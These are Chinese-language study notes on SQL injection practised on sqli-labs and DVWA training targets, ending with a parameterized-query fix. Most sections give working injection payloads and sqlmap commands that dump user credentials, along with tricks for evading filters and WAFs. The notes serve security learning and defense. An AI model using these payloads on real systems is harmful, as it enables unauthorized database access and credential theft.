# SQL 注入（SQL Injection）

> 一句话概述：用户输入被直接拼进 SQL 语句，导致攻击者可以篡改 SQL 逻辑，读取或篡改数据库数据。对应 CWE-89，属于 OWASP Top 10 的「注入」类风险。

## 一、漏洞原理

SQL 注入的根因是程序把不可信输入当作 SQL 语法的一部分来拼接，而不是当作数据来处理。例如后端执行 `SELECT * FROM users WHERE id = '$id'`，当 `$id` 被传入 `1' or '1'='1` 时，拼接后的语句变成 `WHERE id='1' or '1'='1'`，恒真条件使查询返回所有记录。

**成立条件**：存在用户可控的参数，且该参数被直接拼接进 SQL 语句而没有参数化处理。

## 二、手工注入四大流派

### 1. 联合查询注入（UNION-Based）

适用场景：页面有明确回显位（能显示数据库查询结果）。对应 sqli-labs Less-1。

```bash
# 1. 判断闭合：加单引号，报错说明是字符型单引号闭合
?id=1'

# 2. 注释多余代码：--+ 或 %23
?id=1' --+

# 3. 猜列数：order by 3 正常、order by 4 报错 → 3 列
?id=1' order by 3 --+

# 4. 找显位：id=-1 使原查询为空，页面显示 2 和 3 两个回显点
?id=-1' union select 1,2,3 --+

# 5. 爆库名与版本
?id=-1' union select 1,database(),version() --+

# 6. 爆表名（information_schema 元数据表）
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

# 7. 爆列名
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

# 8. 爆数据（0x3a 是冒号，用于分隔用户名和密码）
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users --+
```

### 2. 报错注入（Error-Based）

适用场景：页面没有回显位，但会暴露 SQL 报错信息。对应 sqli-labs Less-5。

```bash
# extractvalue 报错，把查询结果塞进报错信息
?id=1' and extractvalue(1,concat(0x7e,(select database()))) --+
# 回显：XPATH syntax error: '~security'（~ 对应 0x7e）
```

### 3. 布尔盲注（Boolean-Based）

适用场景：页面无回显、无报错，只有「正常 / 不正常」两种状态。对应 sqli-labs Less-8。

```bash
# 猜库名长度
?id=1' and length(database())=8 --+

# 猜第一个字符（115 对应字母 s）
?id=1' and ascii(substr(database(),1,1))=115 --+
```

自动化脚本要点：遍历 ASCII 码，通过判断响应中是否含「You are in」来逐位猜解。脚本中必须加 `found = False` 标志位，猜解到空字符（超出字符串长度）时自动 `break`，否则会陷入无限循环。

### 4. 时间盲注（Time-Based）

适用场景：页面无论条件真假返回内容完全一致。对应 sqli-labs Less-9。

```bash
# 条件成立则休眠 5 秒，用响应时间差判断
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 0) --+

# sleep 被拦截时用 CPU 消耗函数替代
?id=1' and if(ascii(substr(database(),1,1))=115, benchmark(10000000, md5('a')), 0) --+
```

## 三、sqlmap 自动化实战

```bash
# 列出所有数据库
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --dbs --batch

# 直接指定列名导出数据（防止卡在枚举列名阶段）
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users -C "id,username,password" --dump --batch --threads=10

# POST 注入（-p 指定注入参数）
sqlmap -u "http://127.0.0.1/sqli-labs/Less-11/" --data="uname=test&passwd=x" -p "uname" --batch

# 配合 Burp 代理抓包
sqlmap -u "..." --proxy="http://127.0.0.1:8080" --batch

# 伪装 UA 绕过 WAF（--random-agent）
sqlmap -u "..." --random-agent --batch

# 字符集冲突（Illegal mix of collations）时用 --no-cast 或 --hex
sqlmap -u "..." --dump --no-cast --batch
```

### sqlmap 底层 Payload 剖析

sqlmap 发出的典型 Payload 形如：

```sql
test' UNION ALL SELECT NULL,CONCAT(0x71716b7671,IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x716a766271) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

其中 `0x71716b7671` 和 `0x716a766271` 是随机生成的十六进制特征码，sqlmap 用它们包裹真实数据，方便在复杂 HTML 中精准正则提取。手工复现时若报 `Illegal mix of collations`，是因为 CAST 出的字符集（utf8mb4）与原表（gbk）不一致，可加 `CAST(... AS CHAR COLLATE gbk_chinese_ci)` 解决。

## 四、DVWA 靶场难度进阶

| 难度 | 防御 | 绕过 |
|------|------|------|
| Low | 无过滤 | `' union select user,password from users -- -` |
| Medium | 过滤单引号 | 数字型注入（原 SQL 无引号包裹）：`1 union select user,password from users` |
| High | 只返回一条结果 | 用 `LIMIT 1` 限制：`' union select user,password from users LIMIT 1 -- -` |

## 五、实战踩坑记录

1. `#` 注释在浏览器地址栏会被当作页面锚点，不发给服务器，必须改用 `--+` 或 `%23`。
2. PHP 8 遇到 SQL 报错会直接抛出 Fatal Error 中断页面，报错注入前需改靶场源码：开启 `error_reporting(E_ALL)` 并在 `mysqli_query` 前加 `mysqli_report(MYSQLI_REPORT_OFF);`。
3. 新版 MariaDB 移除了 `updatexml`，报错注入请认准 `extractvalue`。
4. 盲注脚本必须加 `found = False` 标志位，猜解到空字符自动 `break`。
5. sqlmap 卡在枚举列名时，直接用 `-C "id,username,password"` 告诉它列名。
6. 跑 sqlmap 务必加 `--batch`，否则自动化会中途停下等待确认。

## 六、防御与修复方案

**开发侧修复（根本）**：使用参数化查询（预处理语句），把 SQL 结构与数据分离。

```php
// ✅ 正确：PDO 预处理语句
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**其他防护层**：数据库账号最小权限（不给 root）；部署 WAF（可被绕过，不能依赖）；生产环境关闭详细报错。

> 依据 OWASP SQL Injection Prevention Cheat Sheet：不要用手动转义替代参数绑定，也不要误以为 ORM 能自动免疫注入。

## 参考来源

- 《第五周-SQL注入.docx》实操复盘笔记
- 《第二部分-Web安全核心操作流程.docx》第 5 周
- OWASP. "SQL Injection Prevention Cheat Sheet." *OWASP Cheat Sheet Series*, cheatsheetseries.owasp.org.
